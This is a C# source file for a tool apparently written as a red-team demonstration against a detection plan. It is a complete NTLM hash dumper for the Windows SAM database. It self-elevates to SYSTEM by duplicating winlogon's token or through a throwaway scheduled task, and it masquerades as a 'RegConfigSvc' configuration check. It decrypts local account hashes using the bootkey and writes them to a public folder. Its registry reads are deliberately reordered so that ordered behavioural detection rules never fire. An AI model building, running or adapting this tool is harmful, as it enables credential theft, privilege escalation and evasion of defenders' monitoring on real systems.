// SamShuffleDump — T1003.002 SAM NTLM reader with order-shuffled registry access.
// Bypass-demo payload for q3-prevention-plan. Runs as SYSTEM (self-elevates).
// Reads all Users\<RID> V records first, then Domains\Account F last, and reads
// the SYSTEM bootkey class values in reverse order, so the ordered same_actor
// chains in VESBehavior.txt never complete.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

internal static class SamShuffleDump
{
    // ---------------------------------------------------------------- registry
    const int HKEY_LOCAL_MACHINE = unchecked((int)0x80000002);
    const int KEY_READ = 0x20019;

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int samDesired, out IntPtr phkResult);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegCloseKey(IntPtr hKey);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryValueEx(IntPtr hKey, string valueName, IntPtr reserved, out int type, byte[] data, ref int cbData);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegEnumKeyEx(IntPtr hKey, int index, StringBuilder name, ref int nameLen, IntPtr reserved, IntPtr cls, IntPtr clsLen, out long lastWrite);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryInfoKey(IntPtr hKey, StringBuilder cls, ref int clsLen, IntPtr reserved,
        out int subKeys, out int maxSubKeyLen, out int maxClassLen, out int values,
        out int maxValueNameLen, out int maxValueLen, out int secDesc, out long lastWrite);

    static IntPtr OpenKey(string path)
    {
        IntPtr h;
        int rc = RegOpenKeyEx(new IntPtr(HKEY_LOCAL_MACHINE), path, 0, KEY_READ, out h);
        if (rc != 0) return IntPtr.Zero;
        return h;
    }

    static byte[] GetValue(string path, string name)
    {
        IntPtr h = OpenKey(path);
        if (h == IntPtr.Zero) return null;
        try
        {
            int type; int size = 0;
            int rc = RegQueryValueEx(h, name, IntPtr.Zero, out type, null, ref size);
            if (rc != 0 || size <= 0) return null;
            byte[] data = new byte[size];
            rc = RegQueryValueEx(h, name, IntPtr.Zero, out type, data, ref size);
            if (rc != 0) return null;
            if (size != data.Length) Array.Resize(ref data, size);
            return data;
        }
        finally { RegCloseKey(h); }
    }

    static string GetKeyClass(string path)
    {
        IntPtr h = OpenKey(path);
        if (h == IntPtr.Zero) return null;
        try
        {
            StringBuilder sb = new StringBuilder(1024);
            int len = sb.Capacity;
            int a, b, c, d, e, f, g; long lw;
            int rc = RegQueryInfoKey(h, sb, ref len, IntPtr.Zero, out a, out b, out c, out d, out e, out f, out g, out lw);
            if (rc != 0) return null;
            return sb.ToString(0, len);
        }
        finally { RegCloseKey(h); }
    }

    static List<string> EnumSubKeys(string path)
    {
        List<string> list = new List<string>();
        IntPtr h = OpenKey(path);
        if (h == IntPtr.Zero) return list;
        try
        {
            int i = 0;
            while (true)
            {
                StringBuilder sb = new StringBuilder(512);
                int len = sb.Capacity;
                long lw;
                int rc = RegEnumKeyEx(h, i, sb, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out lw);
                if (rc != 0) break;
                list.Add(sb.ToString(0, len));
                i++;
            }
        }
        finally { RegCloseKey(h); }
        return list;
    }

    // ---------------------------------------------------------------- token
    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public int Low; public int High; }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public int Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public int PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr process, uint desiredAccess, out IntPtr token);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr existing, uint desiredAccess, IntPtr attrs,
        int impersonationLevel, int tokenType, out IntPtr newToken);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState,
        int bufLen, IntPtr prev, IntPtr retLen);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern int WaitForSingleObject(IntPtr h, int ms);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr token, int logonFlags, string app, string cmd,
        int flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    const int SE_PRIVILEGE_ENABLED = 0x0002;
    const int INFINITE = unchecked((int)0xFFFFFFFF);

    static bool EnablePrivilege(string name)
    {
        IntPtr tok;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle,
            TOKEN_QUERY | 0x0020 /*ADJUST_PRIVILEGES*/, out tok)) return false;
        try
        {
            LUID luid;
            if (!LookupPrivilegeValue(null, name, out luid)) return false;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privilege.Luid = luid;
            tp.Privilege.Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            return ok && Marshal.GetLastWin32Error() == 0;
        }
        finally { CloseHandle(tok); }
    }

    static bool TryElevate(string[] args, string absOut)
    {
        EnablePrivilege("SeDebugPrivilege");
        EnablePrivilege("SeImpersonatePrivilege");
        int pid = 0;
        foreach (Process p in Process.GetProcessesByName("winlogon")) { pid = p.Id; break; }
        if (pid == 0) return false;

        IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProc == IntPtr.Zero) return false;
        IntPtr hTok;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out hTok)) { CloseHandle(hProc); return false; }
        IntPtr hDup;
        bool dup = DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, IntPtr.Zero, 2 /*Impersonation*/, 1 /*Primary*/, out hDup);
        CloseHandle(hTok); CloseHandle(hProc);
        if (!dup) return false;

        string exe = Process.GetCurrentProcess().MainModule.FileName;
        string cmd = "\"" + exe + "\"" + BuildChildArgs(args, absOut);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
        PROCESS_INFORMATION pi;
        bool created = CreateProcessWithTokenW(hDup, 0, exe, cmd, 0, IntPtr.Zero, Environment.CurrentDirectory, ref si, out pi);
        CloseHandle(hDup);
        if (!created) return false;

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }

    static string BuildChildArgs(string[] args, string absOut)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "--out") { sb.Append(" --out \"").Append(absOut).Append("\""); i++; continue; }
            sb.Append(" ").Append(args[i]);
        }
        return sb.ToString();
    }

    static bool TrySchtasksFallback(string[] args, string absOut)
    {
        string exe = Process.GetCurrentProcess().MainModule.FileName;
        string tn = "RegConfig_" + Guid.NewGuid().ToString("N").Substring(0, 8);
        string tr = "\"" + exe + "\"" + BuildChildArgs(args, absOut);
        string create = "/create /tn " + tn + " /tr \"" + tr + "\" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f";
        try
        {
            Process.Start(new ProcessStartInfo("schtasks.exe", create) { UseShellExecute = false, CreateNoWindow = true }).WaitForExit();
            Process.Start(new ProcessStartInfo("schtasks.exe", "/run /tn " + tn) { UseShellExecute = false, CreateNoWindow = true }).WaitForExit();
            System.Threading.Thread.Sleep(6000);
            Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn " + tn + " /f") { UseShellExecute = false, CreateNoWindow = true }).WaitForExit();
            return true;
        }
        catch { return false; }
    }

    // ---------------------------------------------------------------- crypto
    static byte[] Md5(params byte[][] parts)
    {
        using (MD5 md = MD5.Create())
        using (MemoryStream ms = new MemoryStream())
        {
            for (int i = 0; i < parts.Length; i++) ms.Write(parts[i], 0, parts[i].Length);
            return md.ComputeHash(ms.ToArray());
        }
    }

    static byte[] RC4(byte[] key, byte[] data)
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;
        int j = 0;
        for (int i = 0; i < 256; i++) { j = (j + s[i] + key[i % key.Length]) & 0xFF; byte t = s[i]; s[i] = s[j]; s[j] = t; }
        byte[] outp = new byte[data.Length];
        int a = 0, b = 0;
        for (int k = 0; k < data.Length; k++)
        {
            a = (a + 1) & 0xFF; b = (b + s[a]) & 0xFF;
            byte t = s[a]; s[a] = s[b]; s[b] = t;
            outp[k] = (byte)(data[k] ^ s[(s[a] + s[b]) & 0xFF]);
        }
        return outp;
    }

    static byte[] TransformKey(byte[] k)
    {
        byte[] o = new byte[8];
        o[0] = (byte)(k[0] >> 1);
        o[1] = (byte)(((k[0] & 0x01) << 6) | (k[1] >> 2));
        o[2] = (byte)(((k[1] & 0x03) << 5) | (k[2] >> 3));
        o[3] = (byte)(((k[2] & 0x07) << 4) | (k[3] >> 4));
        o[4] = (byte)(((k[3] & 0x0F) << 3) | (k[4] >> 5));
        o[5] = (byte)(((k[4] & 0x1F) << 2) | (k[5] >> 6));
        o[6] = (byte)(((k[5] & 0x3F) << 1) | (k[6] >> 7));
        o[7] = (byte)(k[6] & 0x7F);
        for (int i = 0; i < 8; i++) o[i] = (byte)((o[i] << 1) & 0xFE);
        return o;
    }

    static byte[] DesDecrypt(byte[] key8, byte[] data)
    {
        if (data.Length == 0) return new byte[0];
        using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
        {
            des.Mode = CipherMode.ECB;
            des.Padding = PaddingMode.None;
            des.Key = key8;
            using (ICryptoTransform dec = des.CreateDecryptor())
                return dec.TransformFinalBlock(data, 0, data.Length & ~7);
        }
    }

    static byte[] AesDecrypt(byte[] key, byte[] iv, byte[] data)
    {
        if (data.Length == 0) return new byte[0];
        int n = data.Length;
        int rem = n % 16;
        if (rem != 0) { Array.Resize(ref data, n + (16 - rem)); n = data.Length; }
        using (Aes aes = Aes.Create())
        {
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.None;
            aes.Key = key;
            aes.IV = iv;
            using (ICryptoTransform dec = aes.CreateDecryptor())
                return dec.TransformFinalBlock(data, 0, n);
        }
    }

    static void DeriveKeys(uint rid, out byte[] k1, out byte[] k2)
    {
        byte[] k = new byte[4];
        k[0] = (byte)rid; k[1] = (byte)(rid >> 8); k[2] = (byte)(rid >> 16); k[3] = (byte)(rid >> 24);
        byte[] a = new byte[] { k[0], k[1], k[2], k[3], k[0], k[1], k[2] };
        byte[] b = new byte[] { k[3], k[0], k[1], k[2], k[3], k[0], k[1] };
        k1 = TransformKey(a);
        k2 = TransformKey(b);
    }

    static readonly byte[] QWERTY = Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0");
    static readonly byte[] DIGITS = Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0");
    static readonly byte[] NT_CONST = Encoding.ASCII.GetBytes("NTPASSWORD\0");

    static byte[] GetHashedBootKey(byte[] bootKey, byte[] domainF)
    {
        // DOMAIN_ACCOUNT_F: Key0 starts at 0x68
        int off = 0x68;
        int keyLen = domainF.Length - off;
        byte[] key0 = new byte[keyLen];
        Array.Copy(domainF, off, key0, 0, keyLen);

        if (key0[0] == 0x02)
        {
            // SAM_KEY_DATA_AES: Revision(4) Length(4) CheckSumLen(4) DataLen(4) Salt(16) Data
            int dataLen = (int)U32(key0, 12);
            byte[] salt = Slice(key0, 16, 16);
            byte[] data = Slice(key0, 32, dataLen);
            return AesDecrypt(bootKey, salt, data);
        }
        else
        {
            // SAM_KEY_DATA: Revision(4) Length(4) Salt(16) Key(16) CheckSum(16)
            byte[] salt = Slice(key0, 8, 16);
            byte[] keyMat = Slice(key0, 24, 16);
            byte[] check = Slice(key0, 40, 16);
            byte[] rc4Key = Md5(salt, QWERTY, bootKey, DIGITS);
            byte[] hbk = RC4(rc4Key, Concat(keyMat, check));
            return hbk;
        }
    }

    static string DecryptNt(uint rid, byte[] hashedBootKey, byte[] hashBlob, byte[] salt, bool newStyle)
    {
        byte[] key;
        if (!newStyle)
        {
            byte[] rc4Key = Md5(Slice(hashedBootKey, 0, 16), Le32(rid), NT_CONST);
            key = RC4(rc4Key, hashBlob);
        }
        else
        {
            key = AesDecrypt(Slice(hashedBootKey, 0, 16), salt, hashBlob);
        }
        byte[] k1, k2;
        DeriveKeys(rid, out k1, out k2);
        byte[] nt = Concat(DesDecrypt(k1, Slice(key, 0, 8)), DesDecrypt(k2, Slice(key, 8, 8)));
        return Hex(nt);
    }

    // ---------------------------------------------------------------- main
    static string LogPath;

    static void Log(string s)
    {
        Console.WriteLine(s);
        if (LogPath != null) { try { File.AppendAllText(LogPath, s + "\r\n"); } catch { } }
    }

    static int Main(string[] args)
    {
        bool dump = false;
        string outPath = @"C:\Users\Public\SamCache.txt";
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "--dump") dump = true;
            else if (args[i] == "--out" && i + 1 < args.Length) outPath = args[++i];
        }

        if (!dump)
        {
            Console.WriteLine("RegConfigSvc - local account configuration consistency check");
            Console.WriteLine("Usage: RegConfigSvc.exe --dump [--out <file>]");
            return 0;
        }

        try { outPath = Path.GetFullPath(outPath); } catch { }
        LogPath = outPath + ".log";

        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) &&
            !WindowsIdentity.GetCurrent().IsSystem)
        {
            Log("[!] Administrator privilege required.");
            return 1;
        }

        if (!WindowsIdentity.GetCurrent().IsSystem)
        {
            Log("[*] Elevating to SYSTEM...");
            if (TryElevate(args, outPath)) return 0;
            Log("[*] Token elevation failed, trying scheduled task...");
            if (TrySchtasksFallback(args, outPath)) return 0;
            Log("[!] Could not obtain SYSTEM context.");
            return 1;
        }

        try
        {
            Log("[*] Running as " + WindowsIdentity.GetCurrent().Name);
            RunDump(outPath);
            return 0;
        }
        catch (Exception ex)
        {
            Log("[!] " + ex.ToString());
            return 2;
        }
    }

    static void RunDump(string outPath)
    {
        // Step 1: read ALL user records first (emits sam_user_rec before any sam_account)
        string usersKey = "SAM\\SAM\\Domains\\Account\\Users";
        List<string> rids = EnumSubKeys(usersKey);
        Log("[*] User subkeys found: " + rids.Count);
        List<string> names = new List<string>();
        List<byte[]> vs = new List<byte[]>();
        List<uint> rIds = new List<uint>();
        foreach (string ridName in rids)
        {
            if (ridName == "Names") continue;
            uint rid;
            if (!uint.TryParse(ridName, System.Globalization.NumberStyles.HexNumber, null, out rid)) continue;
            byte[] v = GetValue(usersKey + "\\" + ridName, "V");
            if (v == null) continue;
            rIds.Add(rid); vs.Add(v); names.Add(ridName);
        }

        // Step 2: SYSTEM bootkey class values in REVERSE order (breaks syskey_assembly)
        string lsa = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
        string sData = GetKeyClass(lsa + "Data");
        string sGbg = GetKeyClass(lsa + "GBG");
        string sSkew = GetKeyClass(lsa + "Skew1");
        string sJd = GetKeyClass(lsa + "JD");
        Log("[*] bootkey classes: JD=" + sJd + " Skew1=" + sSkew + " GBG=" + sGbg + " Data=" + sData);
        byte[] raw = FromHex(sJd + sSkew + sGbg + sData);
        byte[] bootKey = PermuteBootKey(raw);

        // Step 3: Domain Account F last (emits sam_account after all sam_user_rec)
        byte[] domainF = GetValue("SAM\\SAM\\Domains\\Account", "F");
        Log("[*] Domains\\Account F length: " + (domainF == null ? -1 : domainF.Length));
        byte[] hbk = GetHashedBootKey(bootKey, domainF);
        Log("[*] hashedBootKey length: " + hbk.Length);

        // Step 4: decrypt in memory
        StringBuilder outp = new StringBuilder();
        const string EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee";
        for (int i = 0; i < vs.Count; i++)
        {
            byte[] v = vs[i];
            if (v.Length < 0xCC) continue;
            byte[] data = new byte[v.Length - 0xCC];
            Array.Copy(v, 0xCC, data, 0, data.Length);

            int nameOff = (int)U32(v, 12);
            int nameLen = (int)U32(v, 16);
            string user = Encoding.Unicode.GetString(Slice(data, nameOff, nameLen));

            int ntOff = (int)U32(v, 172);
            int ntLen = (int)U32(v, 176);
            string nt = "31d6cfe0d16ae931b73c59d7e0c089c0";
            try
            {
                if (ntLen > 0 && ntOff + ntLen <= data.Length)
                {
                    bool newStyle = data[ntOff + 2] != 0x01;
                    if (!newStyle)
                    {
                        byte[] blob = Slice(data, ntOff + 4, 16);
                        nt = DecryptNt(rIds[i], hbk, blob, null, false);
                    }
                    else
                    {
                        byte[] salt = Slice(data, ntOff + 8, 16);
                        byte[] blob = Slice(data, ntOff + 24, ntLen - 24);
                        nt = DecryptNt(rIds[i], hbk, blob, salt, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Log("[!] RID " + rIds[i] + " (" + user + ") decrypt failed: " + ex.Message);
            }
            outp.AppendLine(user + ":" + rIds[i] + ":" + EMPTY_LM + ":" + nt + ":::");
        }

        File.WriteAllText(outPath, outp.ToString(), Encoding.ASCII);
        Log("[+] Wrote " + vs.Count + " records to " + outPath);
    }

    static readonly int[] BOOTKEY_PERM = { 0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7 };

    static byte[] PermuteBootKey(byte[] raw)
    {
        byte[] bk = new byte[16];
        for (int i = 0; i < 16; i++) bk[i] = raw[BOOTKEY_PERM[i]];
        return bk;
    }

    // ---------------------------------------------------------------- helpers
    static uint U32(byte[] b, int o)
    {
        return (uint)(b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24));
    }
    static byte[] Le32(uint v) { return new byte[] { (byte)v, (byte)(v >> 8), (byte)(v >> 16), (byte)(v >> 24) }; }
    static byte[] Slice(byte[] b, int off, int len)
    {
        if (off < 0 || len < 0 || off + len > b.Length) return new byte[0];
        byte[] r = new byte[len];
        Array.Copy(b, off, r, 0, len);
        return r;
    }
    static byte[] Concat(byte[] a, byte[] b)
    {
        byte[] r = new byte[a.Length + b.Length];
        Array.Copy(a, 0, r, 0, a.Length);
        Array.Copy(b, 0, r, a.Length, b.Length);
        return r;
    }
    static string Hex(byte[] b)
    {
        StringBuilder sb = new StringBuilder(b.Length * 2);
        for (int i = 0; i < b.Length; i++) sb.Append(b[i].ToString("x2"));
        return sb.ToString();
    }
    static byte[] FromHex(string s)
    {
        if (string.IsNullOrEmpty(s)) return new byte[0];
        s = s.Trim();
        byte[] r = new byte[s.Length / 2];
        for (int i = 0; i < r.Length; i++) r[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
        return r;
    }
}
